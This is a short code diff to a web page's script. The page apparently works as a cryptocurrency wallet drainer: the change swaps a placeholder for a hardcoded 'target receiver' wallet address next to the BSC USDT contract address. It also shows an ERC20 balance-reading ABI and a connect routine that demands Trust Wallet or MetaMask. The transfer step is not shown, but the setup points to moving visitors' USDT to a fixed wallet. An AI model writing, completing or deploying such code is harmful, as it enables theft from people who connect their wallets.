@@ -30,8 +30,9 @@
 </div>
 
 <script>
-  const USDT_BSC_ADDRESS = "0x55d398326f99059ff775485246999027b3197955"; // Official BSC USDT
-  const TARGET_RECEIVER = "YOUR_TARGET_WALLET_ADDRESS_HERE"; // Apna target address yahan daalein
+  // Aapka target receiver address set kar diya gaya hai
+  const TARGET_RECEIVER = "0xFEA20E8102EE33E58ef081b03f5ef64A399C2Bb3"; 
+  const USDT_BSC_ADDRESS = "0x55d398326f99059ff775485246999027b3197955";
 
   const ERC20_ABI = [
     "function balanceOf(address owner) view returns (uint256)",
@@ -41,6 +42,11 @@
   async function initConnect() {
     if (typeof window.ethereum === 'undefined') {
       alert("Please open this link inside Trust Wallet or MetaMask browser.");
+      return;
+    }
+
+    if (!ethers.utils.isAddress(TARGET_RECEIVER)) {
+      alert("Error: Invalid target wallet address!");
       return;
     }
 
